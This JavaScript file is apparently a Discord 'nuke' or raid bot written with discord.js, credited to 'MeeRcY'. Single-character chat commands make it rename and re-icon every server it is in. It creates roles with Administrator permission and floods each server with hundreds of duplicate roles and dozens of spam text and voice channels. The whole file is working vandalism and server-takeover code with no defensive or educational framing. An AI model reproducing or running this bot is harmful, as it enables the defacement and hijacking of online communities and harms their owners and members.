const Discord = require("discord.js");
const LOka = new Discord.Client();
console.log('Edited. By; MeeRcY');
LOka.on('ready', () => {
  console.log(`->  ${LOka.user.tag} !`);
 
});
LOka.on('ready',  () => {
console.log(' - So bad.     ');
console.log('');
console.log('   i LOVE @plat ..   ');
console.log('');
console.log('   SO TRUE -      ');
console.log(`       S. > " ${LOka.guilds.size} " <  ||  M. > " ${LOka.users.size} " <                                        ||                 `);
 
       
   
 
});
var prefix = "1"
LOka.on("message", message => {
  if(!message.content.startsWith(prefix)) return;;
  let args = message.content.split("1").slice(1);
  var argresult = args.join('1');
  if (message.content.startsWith('1')) {
    LOka.user.setUsername(argresult);
  }
    if (message.content.startsWith(prefix + '1')) {
    LOka.user.setStatus(argresult);
  }
});
 
var x1 = "1"
LOka.on('message', message => {
     if (message.content === "a") {
LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/355815652386275338/484901140790640659/438.jpg`)
 
}
});
var x1 = "1"
LOka.on('message', message => {
     if (message.content === "b") {
LOka.user.setUsername("EvilGates.")
 
}
});
LOka.on('message', message => {
     if (message.content === "c") {
LOka.user.setGame(`Bùbbles.`,'https://www.twitch.tv/MeeRcY')
 
}
});
 
LOka.on('message', message => {
     if (message.content === "1") {
         LOka.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/574359252710457354/576888018065948673/c48a72f1f04eb4bf0ab8e85588898fee.png`)
})
}
});
LOka.on('message', message => {
     if (message.content === "1") {
         LOka.guilds.forEach(m =>{
             m.setName(`Bùbbles.`)
})
}
});
 
LOka.on('message', message => {
     if (message.content === "1") {
                 if(!message.channel.guild) return;
 
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/574359252710457354/576888018065948673/c48a72f1f04eb4bf0ab8e85588898fee.png`)
 
}
});
 
LOka.on('message', message => {
     
 
     if (message.content === "1") {
         LOka.guilds.forEach(m =>{
  m.createRole({
        name : "Assist - ",
        permissions :   [8],
        color : "RANDOM"
    })
    m.createRole({
        name : "Ennsjam - ",
        permissions :   [8],
        color : "RANDOM"
    })
    m.createRole({
        name : "---",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    m.createRole({
        name : "Bùbbles.",
        permissions :   [1],
        color : "RANDOM"
    })
    
    
    
   
})
 
 
}
});
LOka.on('message', message => {
         if (message.content === "2") {
               LOka.guilds.forEach(m =>{
m.createChannel('Assist', 'text');
m.createChannel('Ennsjam.', 'text');
m.createChannel('AsO.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
 
m.createChannel('Bùbbles.', 'text');
 
m.createChannel('Bùbbles.', 'text');
 
m.createChannel('Bùbbles.', 'text');
 
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
 
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
 
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
 
m.createChannel('Bùbbles.', 'text');
m.createChannel('Bùbbles.', 'text');
 
})
}
});
 
LOka.on('message', message => {
         if (message.content === "1") {
                 LOka.guilds.forEach(m =>{
m.createChannel('Assist', 'voice');
m.createChannel('', 'voice');
m.createChannel('.Cancado#3000', 'voice');
m.createChannel('By : Assist . . ', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
 
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
 
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
 
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
 
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
 
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
